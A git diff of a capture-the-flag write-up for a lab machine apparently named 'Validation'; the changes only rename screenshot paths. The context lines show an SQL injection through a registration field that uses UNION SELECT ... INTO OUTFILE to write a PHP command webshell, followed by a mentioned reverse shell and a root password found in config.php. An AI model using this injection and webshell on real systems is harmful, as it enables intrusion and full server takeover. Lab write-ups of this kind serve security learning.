@@ -4,13 +4,13 @@
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(3218).png>)
+![](../../../.gitbook/assets/validation-5.png)
 
 ### SQL Injection for RCE
 
 The website contains a simple register function that takes user input.
 
-![](<../../../.gitbook/assets/image%20(2891).png>)
+![](../../../.gitbook/assets/validation-2.png)
 
 When proxying the traffic, the POST request is submitted like so:
 
@@ -20,7 +20,7 @@ username='&country=Afganistan
 
 When viewing our request, this is what we would see:
 
-![](<../../../.gitbook/assets/image%20(3203).png>)
+![](../../../.gitbook/assets/validation-4.png)
 
 A quick directory scan reveals there is an `account.php` endpoint on the machine.
 
@@ -55,7 +55,7 @@ by Ben "epi" Risher 🤓                 ver: 2.3.1
 
 The `config.php` endpoint presented an empty screen, which I think we have to look into after gaining a shell. Anyways, the `account.php` file displayed an SQL error when trying to view the player I registered.
 
-![](<../../../.gitbook/assets/image%20(789).png>)
+![](../../../.gitbook/assets/validation-7.png)
 
 Instead of enumerating the database, I directly wrote a webshell into the page.
 
@@ -63,7 +63,7 @@ Instead of enumerating the database, I directly wrote a webshell into the page.
 username=a&Afganistan' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php';#
 ```
 
-![](<../../../.gitbook/assets/image%20(1158).png>)
+![](../../../.gitbook/assets/validation-1.png)
 
 Then, we can get a reverse shell and enumerate the `config.php` file we saw earlier.
 
@@ -71,6 +71,6 @@ Then, we can get a reverse shell and enumerate the `config.php` file we saw earl
 
 Within the config file, there was a password, which happened to be the root password.
 
-![](<../../../.gitbook/assets/image%20(3591).png>)
+![](../../../.gitbook/assets/validation-6.png)
 
-![](<../../../.gitbook/assets/image%20(3046).png>)
+![](../../../.gitbook/assets/validation-3.png)
